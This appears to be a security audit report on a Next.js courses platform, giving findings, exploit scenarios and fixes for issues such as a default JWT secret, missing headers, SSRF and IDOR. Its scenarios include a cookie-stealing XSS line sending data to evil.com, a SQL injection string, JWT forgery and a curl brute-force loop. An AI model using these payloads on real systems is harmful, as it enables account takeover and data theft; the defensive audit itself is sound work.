# Security Audit Report - Courses Platform
**Date:** January 9, 2026
**Auditor:** Senior Security Engineer
**Scope:** Full-stack Next.js Application (App Router)

---

## 1. THREAT MODEL SUMMARY

### Application Overview
A courses platform enabling:
- Student and instructor authentication (dual-role support)
- Course management and enrollment
- File uploads (profile pictures, course covers, materials)
- Forum/discussion boards
- Password reset flow
- Email notifications

### Key Assets
1. **User credentials** (passwords, JWT tokens, session cookies)
2. **Personal Identifiable Information** (PII: names, emails, birthdays)
3. **Course content** (materials, videos, documents)
4. **Forum discussions** (student/instructor posts)
5. **Authentication tokens** (JWT, CSRF, password reset)
6. **Database integrity** (PostgreSQL/Neon)

### Attacker Goals
1. Account takeover (steal credentials or JWT tokens)
2. Unauthorized access to courses/materials
3. Data exfiltration (PII scraping)
4. Privilege escalation (student → instructor → admin)
5. SQL injection for data manipulation
6. XSS for credential theft
7. CSRF for unauthorized actions
8. File upload exploitation (malware, path traversal)

---

## 2. TOP 10 CRITICAL FINDINGS (PRIORITIZED)

### 🔴 CRITICAL #1: Weak Default JWT Secret
**Severity:** CRITICAL
**File:** `lib/jwt.ts:4-5`
**CWE:** CWE-798 (Use of Hard-coded Credentials)

**Code:**
```typescript
const JWT_SECRET = new TextEncoder().encode(
  process.env.JWT_SECRET || 'your-secret-key-min-32-chars'
);
```

**Risk:** If `JWT_SECRET` env var is not set, the application uses a **publicly known default secret**. Attackers can forge JWTs to impersonate any user (including admins).

**Exploit Scenario:**
```bash
# Attacker crafts JWT with admin role
jwt = sign({ userId: "target-user", userType: "instructor", role: "admin" }, "your-secret-key-min-32-chars")
# Set cookie: auth_token=<forged_jwt>
# Full admin access achieved
```

**Recommended Fix:**
```typescript
const JWT_SECRET = (() => {
  const secret = process.env.JWT_SECRET;
  if (!secret || secret.length < 32) {
    throw new Error('JWT_SECRET must be set and at least 32 characters');
  }
  return new TextEncoder().encode(secret);
})();
```

---

### 🔴 CRITICAL #2: Missing Security Headers
**Severity:** CRITICAL
**File:** `next.config.ts` (entire file)
**CWE:** CWE-16 (Configuration)

**Risk:** No security headers configured:
- **No Content-Security-Policy** → XSS attacks possible
- **No X-Frame-Options** → Clickjacking possible
- **No Strict-Transport-Security** → HTTPS downgrade attacks
- **No X-Content-Type-Options** → MIME-sniffing attacks

**Exploit Scenario:**
```html
<!-- Attacker injects XSS via forum post -->
<script>fetch('https://evil.com?cookie='+document.cookie)</script>
<!-- No CSP blocks this, cookie stolen -->
```

**Recommended Fix:**
```typescript
const nextConfig: NextConfig = {
  async headers() {
    return [
      {
        source: '/:path*',
        headers: [
          {
            key: 'X-DNS-Prefetch-Control',
            value: 'on'
          },
          {
            key: 'Strict-Transport-Security',
            value: 'max-age=63072000; includeSubDomains; preload'
          },
          {
            key: 'X-Frame-Options',
            value: 'SAMEORIGIN'
          },
          {
            key: 'X-Content-Type-Options',
            value: 'nosniff'
          },
          {
            key: 'X-XSS-Protection',
            value: '1; mode=block'
          },
          {
            key: 'Referrer-Policy',
            value: 'strict-origin-when-cross-origin'
          },
          {
            key: 'Permissions-Policy',
            value: 'camera=(), microphone=(), geolocation=()'
          },
          {
            key: 'Content-Security-Policy',
            value: [
              "default-src 'self'",
              "script-src 'self' 'unsafe-inline' 'unsafe-eval' https://www.googletagmanager.com",
              "style-src 'self' 'unsafe-inline'",
              "img-src 'self' data: https:",
              "font-src 'self' data:",
              "connect-src 'self' https://www.google-analytics.com",
              "frame-ancestors 'self'",
            ].join('; ')
          }
        ]
      }
    ];
  },
  // ... rest of config
};
```

---

### 🔴 CRITICAL #3: SQL Injection via Potential Unsafe Queries
**Severity:** CRITICAL
**File:** `lib/auth-actions.ts:417-419`, `lib/course-actions.ts` (multiple locations)
**CWE:** CWE-89 (SQL Injection)

**Risk:** While using `postgres` library with template literals provides SQL injection protection, there are **unsanitized string inputs** that could be exploited if any raw queries exist or future code changes introduce vulnerabilities.

**Vulnerable Pattern Found:**
```typescript
// lib/auth-actions.ts:417-419
const existingUser = await sql`
  SELECT id FROM users WHERE email = ${normalizedEmail} AND id != ${studentId}
`;
```

**Analysis:** The `postgres` library parameterizes queries correctly, **BUT**:
1. No input validation on `studentId` (could be malformed UUID)
2. No validation on email format
3. If any developer adds string concatenation later, it's vulnerable

**Exploit Scenario:**
```javascript
// If future code does string concatenation:
const query = `SELECT * FROM users WHERE id = '${studentId}'`;
// Attacker sends: studentId = "' OR '1'='1"
// Results in: SELECT * FROM users WHERE id = '' OR '1'='1'
```

**Recommended Fix:**
```typescript
// Add input validation
import { z } from 'zod';

const updateProfileSchema = z.object({
  studentId: z.string().uuid(),
  firstName: z.string().min(1).max(100),
  lastName: z.string().min(1).max(100),
  email: z.string().email().max(255),
  dateOfBirth: z.string().regex(/^\d{4}-\d{2}-\d{2}$/)
});

export async function updateStudentProfileAction(...) {
  // Validate all inputs
  const validated = updateProfileSchema.parse({
    studentId, firstName, lastName, email, dateOfBirth
  });
  // Use validated inputs
  const result = await sql`
    UPDATE users SET ... WHERE id = ${validated.studentId}
  `;
}
```

---

### 🔴 CRITICAL #4: Overly Permissive Image Domains
**Severity:** HIGH
**File:** `next.config.ts:9-19`
**CWE:** CWE-918 (SSRF), CWE-79 (XSS)

**Code:**
```typescript
images: {
  remotePatterns: [
    { protocol: 'https', hostname: '**' },
    { protocol: 'http', hostname: '**' }
  ]
}
```

**Risk:** Allows loading images from **ANY domain** (including `http://`), enabling:
1. **SSRF attacks** via Next.js image optimizer
2. **Mixed content warnings**
3. **Malicious image URLs** in forum posts

**Exploit Scenario:**
```javascript
// Attacker posts forum reply with image
<img src="http://192.168.1.1/admin" />
// Next.js image optimizer proxies request → SSRF to internal network
```

**Recommended Fix:**
```typescript
images: {
  remotePatterns: [
    {
      protocol: 'https',
      hostname: 'your-supabase-project.supabase.co'
    },
    {
      protocol: 'https',
      hostname: 'www.googletagmanager.com'
    }
    // Add only specific trusted domains
  ],
  formats: ['image/avif', 'image/webp'],
  minimumCacheTTL: 60
}
```

---

### 🔴 HIGH #5: Weak Cookie Security (SameSite=Lax)
**Severity:** HIGH
**File:** `lib/cookies.ts:18`
**CWE:** CWE-352 (CSRF)

**Code:**
```typescript
export const getSecureCookieOptions = (): Partial<ResponseCookie> => ({
  httpOnly: true,
  secure: !isDevelopment,
  sameSite: 'lax',  // ⚠️ Should be 'strict'
  path: '/',
  maxAge: COOKIE_MAX_AGE,
});
```

**Risk:** `SameSite=lax` allows cookies to be sent on top-level GET navigations from external sites. While CSRF protection exists, defense-in-depth suggests `strict`.

**Exploit Scenario:**
```html
<!-- Attacker site -->
<a href="https://courses.example.com/api/dangerous-get-endpoint?action=delete">
  Win a prize!
</a>
<!-- Cookie sent with GET request from external site -->
```

**Recommended Fix:**
```typescript
sameSite: 'strict'  // Blocks all cross-site cookie sending
```

**Note:** May require testing authentication flows. If breaks OAuth, use `lax` only for OAuth callback routes.

---

### 🔴 HIGH #6: No Rate Limiting on Authentication Endpoints
**Severity:** HIGH
**Files:** `lib/auth-actions.ts:141-234`, `lib/password-reset-actions.ts:19-100`
**CWE:** CWE-307 (Improper Restriction of Excessive Authentication Attempts)

**Risk:** No rate limiting on:
- `/login` (brute force attacks)
- `/signup` (account enumeration, spam)
- `/reset-password` (email flooding, token brute force)

**Exploit Scenario:**
```bash
# Brute force attack
for password in wordlist.txt; do
  curl -X POST /login -d "email=victim@example.com&password=$password"
done
# No rate limiting → attacker tries 10,000 passwords in minutes
```

**Recommended Fix:**
Implement rate limiting middleware:
```typescript
// lib/rate-limit.ts
import { LRUCache } from 'lru-cache';

type RateLimitOptions = {
  interval: number;
  uniqueTokenPerInterval: number;
};

export function rateLimit(options: RateLimitOptions) {
  const tokenCache = new LRUCache({
    max: options.uniqueTokenPerInterval || 500,
    ttl: options.interval || 60000,
  });

  return {
    check: async (limit: number, token: string) => {
      const tokenCount = (tokenCache.get(token) as number) || 0;

      if (tokenCount === 0) {
        tokenCache.set(token, 1);
      } else if (tokenCount < limit) {
        tokenCache.set(token, tokenCount + 1);
      } else {
        throw new Error('Rate limit exceeded');
      }
    },
  };
}

// Usage in server actions:
const limiter = rateLimit({ interval: 60 * 1000, uniqueTokenPerInterval: 500 });

export async function signInAction(email: string, password: string) {
  try {
    await limiter.check(5, email); // 5 attempts per minute per email
  } catch {
    return { success: false, error: 'Too many attempts. Try again later.' };
  }
  // ... rest of login logic
}
```

---

### 🟠 HIGH #7: Missing Input Validation/Sanitization
**Severity:** HIGH
**Files:** Multiple server actions
**CWE:** CWE-20 (Improper Input Validation)

**Risk:** Several server actions lack comprehensive input validation:
- No max length checks on some inputs
- No sanitization of HTML/special characters
- No validation of date formats

**Examples:**
```typescript
// lib/auth-actions.ts:398-404 - No max length validation
export async function updateStudentProfileAction(
  studentId: string,  // No UUID validation
  firstName: string,  // No max length (could be 10MB)
  lastName: string,
  email: string,
  dateOfBirth: string  // No date format validation
)
```

**Exploit Scenario:**
```javascript
// Attacker sends 10MB firstName
updateStudentProfile(userId, "A".repeat(10_000_000), ...)
// Database rejects, but server resources exhausted
```

**Recommended Fix:**
```typescript
import { z } from 'zod';

const profileUpdateSchema = z.object({
  studentId: z.string().uuid(),
  firstName: z.string().min(1).max(100).trim(),
  lastName: z.string().min(1).max(100).trim(),
  email: z.string().email().max(255).toLowerCase(),
  dateOfBirth: z.string().regex(/^\d{4}-\d{2}-\d{2}$/)
    .refine(date => {
      const d = new Date(date);
      return d < new Date() && d > new Date('1900-01-01');
    }, 'Invalid date of birth')
});

export async function updateStudentProfileAction(...args) {
  const validated = profileUpdateSchema.parse({
    studentId, firstName, lastName, email, dateOfBirth
  });
  // Use validated data
}
```

---

### 🟠 MEDIUM #8: CSRF Token Exposed in GET Request
**Severity:** MEDIUM
**File:** `app/api/auth/session/route.ts:10-18`
**CWE:** CWE-200 (Exposure of Sensitive Information)

**Code:**
```typescript
export async function GET() {
  const session = await getSession();
  const csrfToken = await getOrCreateCSRFToken();

  return NextResponse.json({
    user: session,
    csrfToken,  // ⚠️ Exposed in response
  });
}
```

**Risk:** CSRF token returned in GET request can be logged, cached, or exposed via Referer headers.

**Recommended Fix:**
CSRF tokens should be delivered via cookies only (already done), not in response bodies. Remove from API response:
```typescript
export async function GET() {
  const session = await getSession();
  await getOrCreateCSRFToken(); // Sets cookie, don't return value

  return NextResponse.json({
    user: session,
    // csrfToken removed - client reads from cookie
  });
}
```

Client can read from cookie:
```typescript
const csrfToken = document.cookie
  .split('; ')
  .find(row => row.startsWith('csrf_token='))
  ?.split('=')[1];
```

---

### 🟠 MEDIUM #9: Sensitive Data Logged to Console
**Severity:** MEDIUM
**Files:** `lib/password-reset-actions.ts:71-79`, multiple auth files
**CWE:** CWE-532 (Insertion of Sensitive Information into Log File)

**Code:**
```typescript
console.log('═══════════════════════════════════════════════════════');
console.log('PASSWORD RESET REQUEST');
console.log('═══════════════════════════════════════════════════════');
console.log('Email:', user.email);  // ⚠️ PII logged
console.log('Name:', user.first_name);  // ⚠️ PII logged
console.log('Reset URL:', resetUrl);  // ⚠️ Security token logged
console.log('Token expires at:', expiresAt.toISOString());
console.log('Locale:', locale);
console.log('═══════════════════════════════════════════════════════');
```

**Risk:** Production logs may contain:
- PII (emails, names)
- Security tokens (password reset URLs)
- Credentials (if error logging includes request bodies)

**Recommended Fix:**
```typescript
// Remove all console.log in production
if (process.env.NODE_ENV === 'development') {
  console.log('[DEV] Password reset requested for:', user.email);
}

// Use structured logging
import pino from 'pino';
const logger = pino({
  redact: ['email', 'password', 'token', '*.email', '*.password'],
  level: process.env.NODE_ENV === 'production' ? 'info' : 'debug'
});

logger.info({ userId: user.id }, 'Password reset requested');
```

---

### 🟡 MEDIUM #10: Missing Authorization Check on Profile Updates
**Severity:** MEDIUM
**File:** `lib/auth-actions.ts:398-468`
**CWE:** CWE-639 (Authorization Bypass)

**Code:**
```typescript
export async function updateStudentProfileAction(
  studentId: string,  // ⚠️ Comes from client
  firstName: string,
  lastName: string,
  email: string,
  dateOfBirth: string
): Promise<AuthResponse> {
  // ... validation ...

  // No check: Does current session user === studentId?
  const result = await sql`
    UPDATE users
    SET first_name = ${firstName}, ...
    WHERE id = ${studentId}
  `;
}
```

**Risk:** Missing authorization check. Attacker could modify `studentId` parameter to update other users' profiles (IDOR - Insecure Direct Object Reference).

**Exploit Scenario:**
```javascript
// Attacker calls from client
updateStudentProfileAction(
  "victim-user-id",  // Different user
  "Hacked", "Account", "attacker@evil.com", "1990-01-01"
)
// No check prevents updating victim's profile
```

**Recommended Fix:**
```typescript
export async function updateStudentProfileAction(
  studentId: string,
  firstName: string,
  lastName: string,
  email: string,
  dateOfBirth: string
): Promise<AuthResponse> {
  // Get current session
  const session = await requireUserType('student');

  // Authorization check
  if (session.id !== studentId) {
    return { success: false, error: 'Forbidden' };
  }

  // Proceed with update
  const result = await sql`UPDATE users ...`;
}
```

---

## 3. ADDITIONAL FINDINGS (11-20)

### 🟡 MEDIUM #11: No Request Size Limits
**File:** All API routes
**Risk:** DoS via large request bodies

### 🟡 MEDIUM #12: Missing Error Boundaries
**File:** Client components
**Risk:** Stack traces leaked to users

### 🟡 MEDIUM #13: No Helmet.js or Security Middleware
**Risk:** Missing additional security layers

### 🟡 LOW #14: No Subresource Integrity (SRI)
**Risk:** CDN compromise could inject malicious scripts

### 🟡 LOW #15: Verbose Error Messages
**Risk:** Information disclosure in error responses

### 🟡 LOW #16: No Account Lockout Policy
**Risk:** Brute force attacks on accounts

### 🟡 LOW #17: JWT Expiration Too Long (7 days)
**Risk:** Extended window for token theft

### 🟡 LOW #18: No Session Rotation After Password Change
**Risk:** Stolen tokens remain valid after password reset

### 🟡 LOW #19: No HSTS Preload Header
**Risk:** First request vulnerable to downgrade

### 🟡 LOW #20: Missing Audit Logging
**Risk:** No forensics after security incidents

---

## 4. DEPENDENCY ANALYSIS

```bash
npm audit: 0 vulnerabilities found
```

✅ **Good:** All dependencies up-to-date with no known vulnerabilities.

**Recommendations:**
1. Enable automated dependency scanning (Dependabot/Renovate)
2. Pin dependency versions in package.json
3. Regularly run `npm audit` in CI/CD

---

## 5. REMEDIATION PLAN (STEP-BY-STEP)

### Phase 1: CRITICAL FIXES (Immediate - Day 1)
1. ✅ Fix default JWT secret (enforce via startup check)
2. ✅ Add security headers to next.config.ts
3. ✅ Restrict image domains to whitelist
4. ✅ Add authorization checks to all server actions

### Phase 2: HIGH PRIORITY (Week 1)
1. ✅ Implement rate limiting on auth endpoints
2. ✅ Add Zod validation to all server actions
3. ✅ Change SameSite cookie to 'strict'
4. ✅ Remove CSRF token from GET response

### Phase 3: MEDIUM PRIORITY (Week 2-3)
1. ✅ Remove sensitive logging
2. ✅ Add input sanitization
3. ✅ Implement request size limits
4. ✅ Add proper error boundaries

### Phase 4: HARDENING (Week 4)
1. ✅ Add audit logging
2. ✅ Implement session rotation
3. ✅ Reduce JWT expiration
4. ✅ Add account lockout

---

## 6. VERIFICATION CHECKLIST

After fixes applied, verify:

- [ ] No default secrets in codebase
- [ ] Security headers present (test with securityheaders.com)
- [ ] Rate limiting blocks brute force (test with 100 requests)
- [ ] CSRF protection works on all POST/PUT/DELETE
- [ ] Authorization checks prevent IDOR
- [ ] SQL injection tests fail (SQLMap)
- [ ] XSS payloads blocked by CSP
- [ ] File uploads validate type/size
- [ ] Sensitive data not in logs
- [ ] JWT tokens expire appropriately

---

## 7. ONGOING SECURITY CONTROLS

### CI/CD Checks
```yaml
# .github/workflows/security.yml
name: Security Checks
on: [push, pull_request]
jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - run: npm audit
      - run: npm run lint
      - run: npm run type-check
      - run: npx eslint-plugin-security
```

### Linting Rules
```javascript
// .eslintrc.js
module.exports = {
  plugins: ['security'],
  extends: ['plugin:security/recommended'],
  rules: {
    'security/detect-object-injection': 'warn',
    'security/detect-non-literal-regexp': 'warn',
    'security/detect-unsafe-regex': 'error'
  }
};
```

### Monitoring
1. Enable Sentry error tracking (already configured)
2. Add rate limit alerts
3. Monitor failed auth attempts
4. Alert on unusual access patterns

---

## 8. RESPONSIBLE DISCLOSURE

If vulnerabilities are discovered:
1. Do not exploit in production
2. Report to security@yourdomain.com
3. Allow 90 days for remediation
4. Coordinate disclosure timing

---

**End of Report**
